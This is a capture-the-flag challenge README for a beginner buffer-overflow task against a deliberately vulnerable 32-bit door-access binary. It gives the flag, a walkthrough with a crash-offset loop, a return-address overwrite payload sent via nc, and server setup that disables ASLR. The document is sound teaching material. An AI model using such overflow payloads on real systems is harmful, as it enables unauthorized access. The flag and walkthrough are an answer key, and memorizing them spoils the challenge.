# Open_Sesame

**Author:** Raed Fayad / raed_f (discord)

**Category:** PWN

## Description

Open Sesame is a beginner-level PWN challenge that teaches classic stack-based buffer overflow. Players reverse a 32-bit Linux binary where input is read using gets(), allowing them to overwrite the return address and jump to a hidden print_access_logs() function. It's ideal as a first PWN task, with mitigations like stack canaries and PIE disabled. The challenge should be hosted via socat, and the binary provided to the players.

### Files

- [door_access](release_files/door_access) - The binary to exploit

### Host

```sh
$ nc <server_ip> 1337
```

## Part 1

**CTFd name:** Open Sesame

### CTFd Description

Your mission is to enter a locked ballot-counting room. Without a key card of your own, you must find another key card to open the door and get inside. Luckily, the admin interface of the door access system is accessible from the facility's network. Can you trick the system into giving you some recent key card access logs?

The flag is the UUID of the key card that was most recently granted access to the ballot-counting room.

Free hint - the door access system is a simple program that was compiled for Linux i386 architecture.

### Depends on

None

### Flag

<details>
<summary>(expand to read)</summary><br>

1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6e

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

Use the radare2 image (or [install radare2 locally](https://rada.re/n/radare2.html)) to analyze the binary and find the location of the interesting functions, like `print_access_logs`:

```sh
$ docker run --tty --interactive --privileged --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --security-opt apparmor=unconfined -v .:/server_files radare/radare2
r2@17ae27db2f9b:~$ cd /server_files/
r2@17ae27db2f9b:/server_files$ r2 door_access
[0x080490d0]> aaa
...
[0x080490d0]> afl
...
0x080491f6    3    142 sym.print_access_logs
...
[0x080490d0]> exit
```

Grab the address of the print_access_logs function convert it to little endian format, for example: `0x 08 04 91 f6` becomes `0x f6 91 04 08`, and then convert it to the hex format `b"\xf6\x91\x04\x08"`.

Then, you will need to find the offset of the return address in the stack. You can do this by writing a simple bash script that generates a payload of `A`s until the program crashes:

```bash
for i in $(seq 1 60); do
  python3 -c "print('A'*$i)" | ./door_access > /dev/null
  echo "Tried $i bytes"
done
```

Once you get a segfault, you know roughly the input size that caused it. This helps you approximate the overflow point. In this case, the program crashes when you enter 44 `A`s, you can then try an offset of 44 bytes, and then increase it by incrementes of 4 bytes until you find the exact offset.

The offset is 48 bytes, so you will need to enter 48 `A`s followed by the address of the print_access_logs function.

Then, if you are using an ubuntu amd64 machine or VM, use the following command to generate the payload and pipe it to the binary locally to test it (when testing locally, you won't be able to see the flag, but you will see a helpful error message if the exploit worked):

```sh
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*48 + b"\xf6\x91\x04\x08")' | ./door_access
...
Almost there! Enter the same passcode on this challenge's server to reveal the logs.

```

Otherwise, if you are using a different architecture, or if you want to skip the local test, you can send the payload directly to the open_sesame challenge server:

```sh
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*48 + b"\xf6\x91\x04\x08")' | nc < server_ip > < server_port >
Welcome to the Remote Door Access System!
The passcode that you have entered is being confirmed...
Access Denied! Try again.

Here are the most recent physical key card access logs:
2025-06-14 07:12:34 | CardID: 7e3f2c8e-1b2a-4c5d-9f6e-8a7b6c5d4e3f | Access: Granted | Door: Ballot Counting Room
2025-06-14 09:01:55 | CardID: 9f8e7d6c-5b4a-3c2d-1e0f-9a8b7c6d5e4f | Access: Granted | Door: Ballot Counting Room
2025-06-14 09:15:22 | CardID: 7e3f2c8e-1b2a-4c5d-9f6e-8a7b6c5d4e3f | Access: Granted | Door: Ballot Counting Room
2025-06-14 10:00:15 | CardID: 3e2f1c4d-5b6a-7c8d-9e0f-1a2b3c4d5e6f | Access: Denied  | Door: Ballot Counting Room
2025-06-14 10:13:12 | CardID: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6e | Access: Granted | Door: Ballot Counting Room
2025-06-14 11:42:11 | CardID: 2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e | Access: Denied  | Door: Ballot Counting Room

Segmentation fault (core dumped)
```

The flag is `1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6e`.

</details>

## Setup instructions

### How to generate a new door_access binary file

1. Set up an ubuntu server with amd64 architecture (without any virtualization of architecture, meaning that the host machine must be amd64).
2. Install the required packages:

```sh
$ dpkg --add-architecture i386 && apt update && apt install -y gcc libc6-dev socat libc6:i386 gcc-multilib
```

2.1 Install [docker](https://docs.docker.com/engine/install/ubuntu/#install-using-the-convenience-script), and [docker-compose](https://www.digitalocean.com/community/tutorials/how-to-install-docker-compose-on-ubuntu-18-04#step-1-installing-docker-compose).

2.2 Disable ASLR (Address space layout randomization)

```sh
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

3. Copy the [server_files](/challenges/jeopardy/pwn/open_sesame/server_files) directory to the server. If the files are already in the server, make sure to remove the existing files before running the following:

```sh
$ scp -r < path-to-repo >/CS2025-NTL/challenges/jeopardy/pwn/open_sesame/server_files < user >@< server_ip >:~
# for example scp -r /Users/raedfayad/git/personal/CS2025-NTL/challenges/jeopardy/pwn/open_sesame/server_files vpcadmin@10.0.2.31:~
```

4. On the server, navigate to the directory where you copied the files, and build the binary:

```sh
$ cd ~/server_files
$ make build
```

5. Run the binary on the server to test it runs (just a sanity check):

```sh
$ cd ~/server_files
$ ./door_access
```

6. Go through the [service depoloyment](#service-deployment) so you are ready to test this binary.

7. On your machine, copy the generated binary from the server to your local machine, and provide it to the challenge participants:

```sh
$ scp < user >@< server_ip >:~/server_files/door_access < path-to-repo >/CS2025-NTL/challenges/jeopardy/pwn/open_sesame/server_files
# for example scp vpcadmin@10.0.2.31:~/pwn-challenge/door_access /Users/raedfayad/git/personal/CS2025-NTL/challenges/jeopardy/pwn/open_sesame/server_files
```

8. Go through the [challenge walkthrough](#walkthrough) to make sure the flag is still reachable.

### Service Deployment

1. On the ubuntu amd64 server, navigate to the directory where you copied the files, and run the docker image:

```sh
$ cd ~/server_files
$ make run
```

If you encounter issues, the service might be already running, so you can stop it first:

```sh
$ make stop
```
